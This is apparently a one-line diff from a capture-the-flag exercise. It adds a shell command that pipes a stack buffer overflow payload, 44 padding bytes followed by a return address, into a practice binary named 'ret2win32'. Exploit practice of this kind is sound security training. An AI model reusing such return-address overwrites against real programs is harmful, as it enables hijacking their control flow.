@@ -1,0 +1,1 @@
+echo -n -e 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x2c\x86\x04\x08' | ./ret2win32
